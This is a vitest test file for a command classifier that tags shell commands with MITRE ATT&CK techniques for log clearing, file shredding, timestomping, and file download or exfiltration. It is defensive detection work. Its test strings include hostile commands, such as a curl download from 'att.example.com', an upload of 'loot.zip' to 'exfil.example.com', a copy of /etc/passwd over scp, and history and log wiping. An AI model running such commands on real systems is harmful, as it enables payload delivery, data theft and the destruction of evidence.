import { describe, it, expect } from 'vitest'
import { detectCleanup, detectFileTransfer } from '../src/core/technique-tagger'

describe('detectCleanup', () => {
  it('history -c', () => {
    const c = detectCleanup('history -c')
    expect(c?.subtype).toBe('history_clear')
    expect(c?.mitreTtp).toBe('T1070.003')
  })
  it('journalctl vacuum', () => {
    expect(detectCleanup('sudo journalctl --vacuum-time=1s')?.subtype).toBe('log_clear')
  })
  it('shred with target', () => {
    const c = detectCleanup('shred -u /tmp/payload')
    expect(c?.tool).toBe('shred')
    expect(c?.target).toBe('/tmp/payload')
    expect(c?.mitreTtp).toBe('T1070.004')
  })
  it('touch -t timestomp', () => {
    const c = detectCleanup('touch -t 202001010000.00 /var/log/app.log')
    expect(c?.subtype).toBe('timestomp')
    expect(c?.target).toBe('/var/log/app.log')
  })
  it('chattr +i to hide file', () => {
    expect(detectCleanup('chattr +i /etc/shadow')?.subtype).toBe('attr_hide')
  })
  it('regular touch is NOT flagged', () => {
    expect(detectCleanup('touch newfile.txt')).toBeNull()
  })
})

describe('detectFileTransfer', () => {
  it('curl -o download', () => {
    const f = detectFileTransfer('curl -o /tmp/x.sh https://att.example.com/x.sh')
    expect(f?.direction).toBe('download')
    expect(f?.url).toBe('https://att.example.com/x.sh')
    expect(f?.localPath).toBe('/tmp/x.sh')
    expect(f?.mitreTtp).toBe('T1105')
  })
  it('curl upload with -T', () => {
    const f = detectFileTransfer('curl -T /tmp/loot.zip https://exfil.example.com/')
    expect(f?.direction).toBe('upload')
    expect(f?.mitreTtp).toBe('T1041')
  })
  it('scp direction by argument order', () => {
    expect(detectFileTransfer('scp file.txt user@remote:/tmp/')?.direction).toBe('upload')
    expect(detectFileTransfer('scp user@remote:/etc/passwd .')?.direction).toBe('download')
  })
  it('python http.server as staging', () => {
    expect(detectFileTransfer('python3 -m http.server 8000')?.tool).toBe('python-http.server')
  })
  it('curl without -o is not a transfer', () => {
    expect(detectFileTransfer('curl https://example.com')).toBeNull()
  })
})
